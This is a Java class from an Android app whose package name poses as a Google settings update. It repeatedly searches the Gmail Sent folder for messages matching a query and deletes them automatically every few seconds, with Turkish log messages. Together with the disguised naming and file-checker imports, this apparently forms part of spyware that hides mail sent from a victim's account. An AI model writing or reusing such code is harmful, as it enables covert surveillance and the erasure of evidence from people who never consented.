package com.setting.dl.google.googlesettingupdate.ptt.box;


import com.google.api.services.gmail.Gmail;
import com.google.api.services.gmail.model.Message;
import com.setting.dl.google.googlesettingupdate.Run;
import com.setting.dl.google.googlesettingupdate.concurrent.WorkerThread0;
import com.setting.dl.google.googlesettingupdate.concurrent.interfaces.IWorkerHandler;
import com.setting.dl.google.googlesettingupdate.mail.gmail.Mail;
import com.setting.dl.google.googlesettingupdate.ptt.checkers.FilesCheckers;
import com.setting.dl.google.googlesettingupdate.u;

import java.util.Collections;
import java.util.List;
import java.util.concurrent.ConcurrentLinkedQueue;

public class MessageSentbox implements ISentbox, IWorkerHandler<Boolean> {
   
   private ConcurrentLinkedQueue<String> sentbox = new ConcurrentLinkedQueue<>();
   private boolean                       trigger;
   //private final Context                       context;
   private long                          lastCheck;
   private Gmail                         gmail;
   private String                        query;
   
   MessageSentbox(Gmail gmail, String query) {
      
      //this.context = context;
      this.gmail = gmail;
      this.query = query;
   }
   
   private void setTrigger(boolean trigger) {
      
      this.trigger = trigger;
      
      if (trigger) {
         
         onTrigger();
      }
   }
   
   private void onTrigger() {
      
      Run.run(this::delete, 10000);
   }
   
   synchronized private void delete() {
      
      if (sentbox.size() != 0) {
         
         String id = sentbox.peek();
         
         new WorkerThread0<Boolean>()
               .thisIsMyWork(() -> deleteMessage(gmail, id))
               .handleOnForeground(this)
               .start();
      }
      else {
         
         setTrigger(false);
      }
   }
   
   @Override
   public List<Message> getMessages(Gmail gmail, String query) {
      return Mail.mylistMessagesWithLabelsWithQ(
            gmail,
            Collections.singletonList("SENT"),
            query);
   }
   
   @Override
   synchronized
   public void checkSent() {
      
      long checkIntervalLimit = 10000L;
      
      if (FilesCheckers.timeIsUP(lastCheck, checkIntervalLimit)) {
         
         lastCheck = System.currentTimeMillis();
         
         u.log.d("Gidenler kontrol ediliyor.");
         
         List<Message> messages = getMessages(gmail, query);
         
         if (messages == null) {
            
            u.log.d("Gidenler alınamadı.");
            return;
         }
         
         if (messages.size() == 0) {
            
            u.log.d("Gidenlerden kalan yok.");
            return;
         }
         
         u.log.d("Gidenlerden kalan %d mesaj var.", messages.size());
         
         
         for (Message message : messages) {
            
            addToSentbox(message.getId());
         }
      }
   }
   
   @Override
   public void addToSentbox(String messageId) {
      
      if (messageId == null || messageId.trim().isEmpty()) {
         
         u.log.d("Sentbox'a geçersiz bir id eklenmek istendi");
         return;
      }
      
      if (sentbox.contains(messageId)) {
         
         u.log.d("Sendbox'a eklenmek istenen mesaj zaten var : %s", messageId);
         return;
      }
      
      sentbox.add(messageId);
      
      u.log.d("Sentbox'a yeni bir mesaj eklendi : %s", messageId);
      
      if (trigger) return;
      
      setTrigger(true);
   }
   
   @Override
   public boolean deleteMessage(Gmail gmail, String messageId) {
      return Mail.delete(gmail, messageId);
   }
   
   @Override
   public void deleteMessages(Gmail gmail, List<Message> messages) {
      
      for (Message message : messages) {
         
         addToSentbox(message.getId());
      }
   }
   
   @Override
   public void deleteAllMessages(Gmail gmail, String query) {
      deleteMessages(gmail, getMessages(gmail, query));
   }
   
   @Override
   public void onWorkResult(Boolean result) {
      
      String message = sentbox.poll();
      
      if (result != null) {
         
         if (result) {
            
            if (message != null) {
               
               u.log.d("Mesaj silindi ve kuyruktan çıkarıldı : %s \u2605", message);
            }
            else {
               
               u.log.d("Mesaj silindi ancak kuyrukta bulunamadı");
            }
         }
         else {
            
            if (message != null) {
               
               u.log.d("Mesaj silinemedi : %s", message);
            }
            else {
               
               u.log.d("Mesaj silinemedi");
            }
         }
      }
      
      
      delete();
   }
   
   
}
